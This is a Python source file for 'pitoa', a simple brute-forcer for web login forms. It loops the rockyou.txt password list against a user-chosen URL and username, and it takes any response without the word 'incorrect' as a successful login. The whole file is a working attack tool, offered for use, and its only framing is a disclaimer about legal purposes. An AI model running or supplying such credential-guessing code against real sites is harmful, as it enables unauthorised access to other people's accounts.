# pitoa IS A FREE TO USE SIMPLE BRUTEFORCER. USE IT FOR LEGAL PURPOSES. 
# I DO NOT TAKE ANY RESPONSABILITY FOR THE ACTIONS YOU MAKE USING THIS TOOL

import requests, sys, time, datetime
from termcolor import colored

banner = colored("""
           __    __                         
          /  |  /  |                        
  ______  $$/  _$$ |_     ______    ______  
 /      \ /  |/ $$   |   /      \  /      \ 
/$$$$$$  |$$ |$$$$$$/   /$$$$$$  | $$$$$$  |
$$ |  $$ |$$ |  $$ | __ $$ |  $$ | /    $$ |
$$ |__$$ |$$ |  $$ |/  |$$ \__$$ |/$$$$$$$ |
$$    $$/ $$ |  $$  $$/ $$    $$/ $$    $$ |
$$$$$$$/  $$/    $$$$/   $$$$$$/   $$$$$$$/ 
$$ |                                        
$$ |                                        
$$/ 
""", "green")

print(banner)

passlist = open("/usr/share/wordlists/rockyou.txt", "r") # ROCKYOU PASSLIST. CHANGE IF NOT IN DEFAULT DIR

setUrl = input("Input the URL you want to bruteforce(ex: 127.0.0.1/login): ") 
setUsername = input("Input the username you want to bruteforce: ")
setDelay = input("Input the delay between requests (in seconds): ")

try:
    float(setDelay)
    delay = setDelay
except:
    print("\n[!] Enter a valid delay amount!")
    sys.exit()

def bruteforce(setUrl):
    for password in passlist: # ITERATE OVER THE ROCKYOU PASSLIST
        password = password.rstrip() # REMOVE NEW LINES 

        login_data = {
            'username' : f'{setUsername}',
            'password' : f'{password}',
            #'login' : ''
        }

        with requests.Session() as s:
            r = s.get(setUrl) # MAKE A GET REQUEST
            
            r = s.post(setUrl, data=login_data) # MAKE A POST REQUEST AND TRY TO LOG IN
            
        if "incorrect" in r.text: # LOGIN FAILED STRING. CHANGE IF N/A.
            text = colored(f"[-] {password} failed for {setUsername}", "red")
            print(text)

        else: # SUCCESSFUL REQUEST
            text = colored(f"[+] {password} succeded for {setUsername}", "green")
            print(text)

        time.sleep(float(delay)) # WAIT FOR THE SET DELAY

now = datetime.datetime.now()
now = now.strftime("%c")
colored(now, "magenta")
print(f"[!] pitoa started at {now}\n")

while True:
    try:
        bruteforce(setUrl)

    except KeyboardInterrupt:
        print("\n[!] pitoa will now exit.")
        sys.exit()

